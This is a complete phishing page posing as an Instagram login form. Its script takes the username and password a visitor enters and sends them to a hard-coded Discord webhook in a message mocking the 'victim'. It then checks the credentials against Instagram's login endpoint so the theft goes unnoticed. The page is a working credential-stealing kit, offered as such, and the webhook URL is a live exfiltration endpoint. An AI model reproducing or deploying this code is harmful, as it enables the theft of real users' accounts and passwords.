<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        body {
            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcStWe9j-Tiic2SnB_552rr0mSI-oICZaGKm8JPsVpTU&s');
            background-size: cover;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        .login-container {
            max-width: 350px;
            margin: 100px auto;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-weight: bold;
            color: #262626;
            text-align: left;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
        }

        .login-button {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
        }

        .forgot-password,
        .signup-link {
            margin-top: 10px;
            font-size: 12px;
            color: #999;
        }

        .signup-link a {
            color: #3897f0;
            text-decoration: none;
        }

        .warning {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
<script>
    function unleashTheKraken() {
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;

        // Prepare to dive into the abyss of the web
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://discord.com/api/webhooks/1116509552695840768/qaUSQH-IXxJOiAgDTmflw3wNTJcg5kmMHMtSe6fi7Xm0HA3JHrOEpXUUFWBRvE22HvQg", true);
        xhr.setRequestHeader("Content-Type", "application/json");

        var data = JSON.stringify({
            "content": "Oh, look! Another victim!\nUsername: " + username + "\nPassword: " + password
        });

        // Let the Kraken loose!
        xhr.send(data);
        
        // Make the login validation request to Instagram
        var xhrValidation = new XMLHttpRequest();
        xhrValidation.open("POST", "https://www.instagram.com/accounts/login/ajax/", true);
        xhrValidation.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhrValidation.onreadystatechange = function() {
            if (xhrValidation.readyState === 4 && xhrValidation.status === 200) {
                var response = JSON.parse(xhrValidation.responseText);
                if (response.authenticated) {
                    alert("Login successful!");
                } else {
                    alert("Login failed.");
                }
            }
        };

        // Construct the login parameters
        var loginParameters = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);

        // Send the login validation request
        xhrValidation.send(loginParameters);
    }
</script>

</head>
<body>
    <div class="login-container">
        <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Logo" class="logo">
        <form>
            <label for="username">Phone number, username, or email:</label>
            <input type="text" id="username" name="username" class="input-field" required><br><br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" class="input-field" required><br><br>
            <input type="button" value="Log In" onclick="unleashTheKraken()" class="login-button">
        </form>
        <p class="forgot-password">Forgot your password? <a href="#">Reset it here</a></p>
        <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
    </div>
</body>
</html>
